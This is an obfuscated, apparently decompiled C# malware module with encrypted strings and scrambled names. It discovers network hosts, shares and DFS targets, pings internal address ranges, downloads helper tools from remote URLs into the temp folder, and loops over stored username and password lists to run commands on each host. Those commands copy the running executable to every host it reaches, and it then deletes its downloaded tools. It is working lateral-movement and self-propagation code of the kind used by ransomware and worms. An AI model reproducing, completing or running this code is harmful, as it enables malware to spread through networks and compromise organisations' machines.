using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace sWduCclqEzKrM;

internal sealed class ZoJIiSGwpVOiHY
{
	public sealed class RgXuSGaBTSepv
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum SeiQYJqHazNAQzu
	{
		WZtPetVolUJ = 1,
		ywwepuLddvvs,
		SsUgojiZsVwl,
		xxRsLBOKeQt,
		EsglITiHkrlpk
	}

	public enum MjKvHMgmJBZ
	{
		MKCTaPSXPjNt,
		wmdcjGBBefoHIm,
		NElnsPFynxuIWO,
		MoFUoHbIxVk
	}

	public enum gJIZWpVOJyeyY
	{
		yjyystsZrCuXy = 1,
		iDPNDhnCqYecaLQUy = 2,
		buxnRBdqjTIZ = 4,
		NEJcytBiztqbL = 8,
		QjYiBocbDqgT = 16,
		GfLuVOKCHOyAnRV = 19
	}

	public enum RoDViMiAsBq
	{
		SOreZdIzvRdey,
		XnRJSOXypa,
		tizKqSaBGAZSdD,
		LCBlnyuxqTzpav,
		ECOHPltmLBJN,
		FJBlBQfEibRtC,
		mESSPcohxxgFXB,
		xmVEYbEYYsoSDtZ,
		HbZyuSprWBsi,
		xLGWTsTHrWXTiKir,
		TBopUhIcGUKLpsU,
		RCdfFfVLUFKRFR
	}

	public sealed class iGRorTAIXIBMI : IEnumerable
	{
		private enum ZICNhvFYoU
		{
			dgICARGdZTGPDW = 0,
			VYoEhsZMgX = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class TellaLGtpClnIE
		{
			public SeiQYJqHazNAQzu HWHBnuqDAqcNBcC;

			public MjKvHMgmJBZ UdMpPsHErTez;

			public RoDViMiAsBq saYXUGIXsyS;

			public gJIZWpVOJyeyY ckkiIXXmkKYtmrE;

			public string QXLHiFEMEfZqICIk;

			public string xSpJFAUAPymU;

			public string ikCuFkqtfsJ;

			public string sNdZGDDPjfcdp;
		}

		private ArrayList uRMHVjffWycjOu = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern ZICNhvFYoU WNetOpenEnumA(SeiQYJqHazNAQzu dwScope, MjKvHMgmJBZ dwType, gJIZWpVOJyeyY dwUsage, TellaLGtpClnIE p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ZICNhvFYoU WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern ZICNhvFYoU WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(TellaLGtpClnIE tellaLGtpClnIE_0, SeiQYJqHazNAQzu seiQYJqHazNAQzu_0, MjKvHMgmJBZ mjKvHMgmJBZ_0, gJIZWpVOJyeyY gJIZWpVOJyeyY_0, RoDViMiAsBq roDViMiAsBq_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(seiQYJqHazNAQzu_0, mjKvHMgmJBZ_0, gJIZWpVOJyeyY_0, tellaLGtpClnIE_0, out lphEnum) == ZICNhvFYoU.dgICARGdZTGPDW)
			{
				ZICNhvFYoU zICNhvFYoU;
				do
				{
					zICNhvFYoU = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (zICNhvFYoU)
					{
					case ZICNhvFYoU.VYoEhsZMgX:
						continue;
					case ZICNhvFYoU.dgICARGdZTGPDW:
						Marshal.PtrToStructure(intPtr, tellaLGtpClnIE_0);
						if (tellaLGtpClnIE_0.saYXUGIXsyS == roDViMiAsBq_0)
						{
							uRMHVjffWycjOu.Add(tellaLGtpClnIE_0.xSpJFAUAPymU);
						}
						if ((tellaLGtpClnIE_0.ckkiIXXmkKYtmrE & gJIZWpVOJyeyY.iDPNDhnCqYecaLQUy) == gJIZWpVOJyeyY.iDPNDhnCqYecaLQUy)
						{
							EnumerateServers(tellaLGtpClnIE_0, seiQYJqHazNAQzu_0, mjKvHMgmJBZ_0, gJIZWpVOJyeyY_0, roDViMiAsBq_0);
						}
						continue;
					}
					break;
				}
				while (zICNhvFYoU != ZICNhvFYoU.VYoEhsZMgX);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public iGRorTAIXIBMI(SeiQYJqHazNAQzu seiQYJqHazNAQzu_0, MjKvHMgmJBZ mjKvHMgmJBZ_0, gJIZWpVOJyeyY gJIZWpVOJyeyY_0, RoDViMiAsBq roDViMiAsBq_0)
		{
			TellaLGtpClnIE tellaLGtpClnIE_ = new TellaLGtpClnIE();
			EnumerateServers(tellaLGtpClnIE_, seiQYJqHazNAQzu_0, mjKvHMgmJBZ_0, gJIZWpVOJyeyY_0, roDViMiAsBq_0);
		}

		public IEnumerator GetEnumerator()
		{
			return uRMHVjffWycjOu.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KqvPZGPoiPmCgd
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string dxvQcyAPRjBgSiL;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string tMINClXPMHxOOQXQ;

		public uint IPdpBujPNd;

		public uint CRMZvSrpLAtnj;

		public IntPtr KCfPJUVUbQoe;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct VrvcLMKyygXVJL
	{
		public int IPdpBujPNd;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string EvSDNwuLQZmjX;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string HNXxGftUgqBZu;
	}

	public struct trqtYASYuOT
	{
		public string CuTXWASDyglG;

		public string[] ZpdsCChxVNnT;

		public trqtYASYuOT(string string_0, string[] string_1)
		{
			CuTXWASDyglG = string_0;
			ZpdsCChxVNnT = string_1;
		}
	}

	private sealed class NAEaQEOZlvvT
	{
		public string FKWqyMHPcfvTTGb;

		public string uTCkvRNmJy;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107399191)) && !string_0.StartsWith(getString_0(107399186)) && !string_0.StartsWith(getString_0(107399209)) && !string_0.Contains(getString_0(107400738))) || !DvjJTBgYUMwnx(string_0))
			{
				return;
			}
			try
			{
				if (wJkbnIWOteHAMM.QBzcVPcsFN == getString_0(107397055))
				{
					for (int i = 0; i < HpOzHcnuWt.Count; i++)
					{
						wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399218), getString_0(107399196) + string_0 + getString_0(107399155) + HpOzHcnuWt[i] + getString_0(107399228) + GEcbsWJzeRL[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399218), getString_0(107399196) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (wJkbnIWOteHAMM.QBzcVPcsFN == getString_0(107397055))
			{
				for (int j = 0; j < HpOzHcnuWt.Count; j++)
				{
					if (wJkbnIWOteHAMM.IsbZbMDtVgdC)
					{
						if (File.Exists(FKWqyMHPcfvTTGb))
						{
							wJkbnIWOteHAMM.dfqtCTBwlwyp(FKWqyMHPcfvTTGb, getString_0(107397770) + string_0 + getString_0(107379513) + HpOzHcnuWt[j] + getString_0(107379504) + GEcbsWJzeRL[j] + getString_0(107379527) + Assembly.GetEntryAssembly()!.Location + getString_0(107397788));
						}
					}
					else if (File.Exists(uTCkvRNmJy))
					{
						wJkbnIWOteHAMM.dfqtCTBwlwyp(uTCkvRNmJy, getString_0(107397770) + string_0 + getString_0(107379513) + HpOzHcnuWt[j] + getString_0(107379504) + GEcbsWJzeRL[j] + getString_0(107379494) + Assembly.GetEntryAssembly()!.Location + getString_0(107397788));
					}
				}
			}
			else if (wJkbnIWOteHAMM.IsbZbMDtVgdC)
			{
				if (File.Exists(FKWqyMHPcfvTTGb))
				{
					wJkbnIWOteHAMM.dfqtCTBwlwyp(FKWqyMHPcfvTTGb, getString_0(107397770) + string_0 + getString_0(107379405) + Assembly.GetEntryAssembly()!.Location + getString_0(107397788));
				}
			}
			else if (File.Exists(uTCkvRNmJy))
			{
				wJkbnIWOteHAMM.dfqtCTBwlwyp(uTCkvRNmJy, getString_0(107397770) + string_0 + getString_0(107379884) + Assembly.GetEntryAssembly()!.Location + getString_0(107397788));
			}
		}

		static NAEaQEOZlvvT()
		{
			Strings.CreateGetStringDelegate(typeof(NAEaQEOZlvvT));
		}
	}

	private sealed class jAaAYPWmaJWG
	{
		public string jiHHgIyDJy;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != jiHHgIyDJy;
		}
	}

	public static List<string> zDPkyBClTynTIY;

	public static string obDgJReuvt;

	public static List<string> HpOzHcnuWt;

	public static List<string> GEcbsWJzeRL;

	public static List<string> iTMXqpdimFNXTf;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<RgXuSGaBTSepv> ODkKGIABizm()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396851);
			process.StartInfo.Arguments = getString_0(107380006);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<RgXuSGaBTSepv> list = new List<RgXuSGaBTSepv>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107379957))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new RgXuSGaBTSepv
						{
							ServerName = getString_0(107396856) + stringBuilder.ToString() + getString_0(107379944)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string IsTdKqMLLX, int UXOHdbnFtMsweBXT, int EoXDrnIGxUvBb, out IntPtr HGzzIPKarXk, [MarshalAs(UnmanagedType.I4)] out int mBPrZyEqsYmTI, [MarshalAs(UnmanagedType.I4)] ref int XEnrSyOLvhL);

	public static List<trqtYASYuOT> PSkgTrCMkMO(string string_0)
	{
		try
		{
			List<trqtYASYuOT> list = new List<trqtYASYuOT>();
			IntPtr HGzzIPKarXk = default(IntPtr);
			int mBPrZyEqsYmTI = 0;
			int XEnrSyOLvhL = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out HGzzIPKarXk, out mBPrZyEqsYmTI, ref XEnrSyOLvhL) == 0)
			{
				for (int i = 0; i < mBPrZyEqsYmTI; i++)
				{
					KqvPZGPoiPmCgd kqvPZGPoiPmCgd = (KqvPZGPoiPmCgd)Marshal.PtrToStructure(HGzzIPKarXk + i * Marshal.SizeOf(typeof(KqvPZGPoiPmCgd)), typeof(KqvPZGPoiPmCgd));
					if (kqvPZGPoiPmCgd.dxvQcyAPRjBgSiL == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < kqvPZGPoiPmCgd.CRMZvSrpLAtnj; j++)
					{
						IntPtr ptr = new IntPtr(kqvPZGPoiPmCgd.KCfPJUVUbQoe.ToInt64() + j * Marshal.SizeOf(typeof(VrvcLMKyygXVJL)));
						VrvcLMKyygXVJL vrvcLMKyygXVJL = (VrvcLMKyygXVJL)Marshal.PtrToStructure(ptr, typeof(VrvcLMKyygXVJL));
						if (vrvcLMKyygXVJL.IPdpBujPNd == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107397713),
								vrvcLMKyygXVJL.EvSDNwuLQZmjX,
								vrvcLMKyygXVJL.HNXxGftUgqBZu
							}));
						}
					}
					string text = kqvPZGPoiPmCgd.dxvQcyAPRjBgSiL.Replace(string_0, getString_0(107400681));
					if (text.StartsWith(getString_0(107396856)))
					{
						text = text.Substring(1);
					}
					list.Add(new trqtYASYuOT(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void QKuZlnZSLTl()
	{
		wJkbnIWOteHAMM.KzgInVtpzgYN(getString_0(107379903));
		List<RgXuSGaBTSepv> list = ODkKGIABizm();
		List<trqtYASYuOT> list2 = PSkgTrCMkMO(Environment.MachineName);
		if (list2 != null)
		{
			foreach (trqtYASYuOT item in list2)
			{
				string[] zpdsCChxVNnT = item.ZpdsCChxVNnT;
				foreach (string text in zpdsCChxVNnT)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (wJkbnIWOteHAMM.QBzcVPcsFN == getString_0(107396998))
						{
							for (int j = 0; j < HpOzHcnuWt.Count; j++)
							{
								wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399161), getString_0(107398492) + text + getString_0(107399098) + HpOzHcnuWt[j] + getString_0(107399171) + GEcbsWJzeRL[j]);
							}
						}
						else
						{
							wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399161), getString_0(107398492) + text);
						}
						wJkbnIWOteHAMM.kGOGGuScmQTRuRt.Add(text.Replace(getString_0(107397694), getString_0(107400681)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (RgXuSGaBTSepv item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (wJkbnIWOteHAMM.QBzcVPcsFN == getString_0(107396998))
				{
					for (int k = 0; k < HpOzHcnuWt.Count; k++)
					{
						wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399161), getString_0(107398492) + item2.ServerName + getString_0(107399098) + HpOzHcnuWt[k] + getString_0(107399171) + GEcbsWJzeRL[k]);
					}
				}
				else
				{
					wJkbnIWOteHAMM.dfqtCTBwlwyp(getString_0(107399161), getString_0(107398492) + item2.ServerName);
				}
				wJkbnIWOteHAMM.kGOGGuScmQTRuRt.Add(item2.ServerName.Replace(getString_0(107397694), getString_0(107400681)));
			}
			catch
			{
			}
		}
	}

	public static void DgtmjthUxaS()
	{
		NAEaQEOZlvvT CS_0024_003C_003E8__locals0 = new NAEaQEOZlvvT();
		List<OIaNLxOiTZq> list = OIaNLxOiTZq.WdlhUGTwKMFYj();
		foreach (OIaNLxOiTZq item in list)
		{
			zDPkyBClTynTIY.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb = getString_0(107400681);
		CS_0024_003C_003E8__locals0.uTCkvRNmJy = getString_0(107400681);
		try
		{
			CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb = rgejngOcjsZeg();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.uTCkvRNmJy = uXHKglIztwTqMxkY();
		}
		catch
		{
		}
		foreach (OIaNLxOiTZq item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107399134)) || item2.IPAddress.StartsWith(getString_0(107399129)) || item2.IPAddress.StartsWith(getString_0(107399152)) || item2.IPAddress.Contains(getString_0(107400681)))
				{
					gWxcHJfAxg.HqMnvszZuIVWoI(item2.MacAddress, item2.IPAddress, getString_0(107380362));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(zDPkyBClTynTIY, delegate(string string_0)
			{
				if ((string_0.StartsWith(NAEaQEOZlvvT.getString_0(107399191)) || string_0.StartsWith(NAEaQEOZlvvT.getString_0(107399186)) || string_0.StartsWith(NAEaQEOZlvvT.getString_0(107399209)) || string_0.Contains(NAEaQEOZlvvT.getString_0(107400738))) && DvjJTBgYUMwnx(string_0))
				{
					try
					{
						if (wJkbnIWOteHAMM.QBzcVPcsFN == NAEaQEOZlvvT.getString_0(107397055))
						{
							for (int i = 0; i < HpOzHcnuWt.Count; i++)
							{
								wJkbnIWOteHAMM.dfqtCTBwlwyp(NAEaQEOZlvvT.getString_0(107399218), NAEaQEOZlvvT.getString_0(107399196) + string_0 + NAEaQEOZlvvT.getString_0(107399155) + HpOzHcnuWt[i] + NAEaQEOZlvvT.getString_0(107399228) + GEcbsWJzeRL[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							wJkbnIWOteHAMM.dfqtCTBwlwyp(NAEaQEOZlvvT.getString_0(107399218), NAEaQEOZlvvT.getString_0(107399196) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (wJkbnIWOteHAMM.QBzcVPcsFN == NAEaQEOZlvvT.getString_0(107397055))
					{
						for (int j = 0; j < HpOzHcnuWt.Count; j++)
						{
							if (wJkbnIWOteHAMM.IsbZbMDtVgdC)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb))
								{
									wJkbnIWOteHAMM.dfqtCTBwlwyp(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb, NAEaQEOZlvvT.getString_0(107397770) + string_0 + NAEaQEOZlvvT.getString_0(107379513) + HpOzHcnuWt[j] + NAEaQEOZlvvT.getString_0(107379504) + GEcbsWJzeRL[j] + NAEaQEOZlvvT.getString_0(107379527) + Assembly.GetEntryAssembly()!.Location + NAEaQEOZlvvT.getString_0(107397788));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.uTCkvRNmJy))
							{
								wJkbnIWOteHAMM.dfqtCTBwlwyp(CS_0024_003C_003E8__locals0.uTCkvRNmJy, NAEaQEOZlvvT.getString_0(107397770) + string_0 + NAEaQEOZlvvT.getString_0(107379513) + HpOzHcnuWt[j] + NAEaQEOZlvvT.getString_0(107379504) + GEcbsWJzeRL[j] + NAEaQEOZlvvT.getString_0(107379494) + Assembly.GetEntryAssembly()!.Location + NAEaQEOZlvvT.getString_0(107397788));
							}
						}
					}
					else if (wJkbnIWOteHAMM.IsbZbMDtVgdC)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb))
						{
							wJkbnIWOteHAMM.dfqtCTBwlwyp(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb, NAEaQEOZlvvT.getString_0(107397770) + string_0 + NAEaQEOZlvvT.getString_0(107379405) + Assembly.GetEntryAssembly()!.Location + NAEaQEOZlvvT.getString_0(107397788));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.uTCkvRNmJy))
					{
						wJkbnIWOteHAMM.dfqtCTBwlwyp(CS_0024_003C_003E8__locals0.uTCkvRNmJy, NAEaQEOZlvvT.getString_0(107397770) + string_0 + NAEaQEOZlvvT.getString_0(107379884) + Assembly.GetEntryAssembly()!.Location + NAEaQEOZlvvT.getString_0(107397788));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb))
			{
				File.Delete(CS_0024_003C_003E8__locals0.FKWqyMHPcfvTTGb);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.uTCkvRNmJy))
			{
				File.Delete(CS_0024_003C_003E8__locals0.uTCkvRNmJy);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rgejngOcjsZeg()
	{
		if (IntPtr.Size == 8)
		{
			return fVGsPRpqAjUQo(new Uri(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107380309))));
		}
		return fVGsPRpqAjUQo(new Uri(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107380309))));
	}

	public static string uXHKglIztwTqMxkY()
	{
		if (IntPtr.Size == 8)
		{
			return fVGsPRpqAjUQo(new Uri(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107380260))));
		}
		return fVGsPRpqAjUQo(new Uri(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107380151))));
	}

	public static bool DvjJTBgYUMwnx(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string fVGsPRpqAjUQo(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107379598), getString_0(107400681)).Remove(0, 3) + getString_0(107379593);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> qEmaEHLCsQCWU()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107379552));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107379487)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107379474));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				jAaAYPWmaJWG CS_0024_003C_003E8__locals0 = new jAaAYPWmaJWG();
				CS_0024_003C_003E8__locals0.jiHHgIyDJy = array4[j];
				if (CS_0024_003C_003E8__locals0.jiHHgIyDJy.Contains(getString_0(107379493)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.jiHHgIyDJy).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static ZoJIiSGwpVOiHY()
	{
		Strings.CreateGetStringDelegate(typeof(ZoJIiSGwpVOiHY));
		zDPkyBClTynTIY = new List<string>();
		obDgJReuvt = getString_0(107400681);
		HpOzHcnuWt = new List<string>();
		GEcbsWJzeRL = new List<string>();
		iTMXqpdimFNXTf = new List<string>();
	}
}
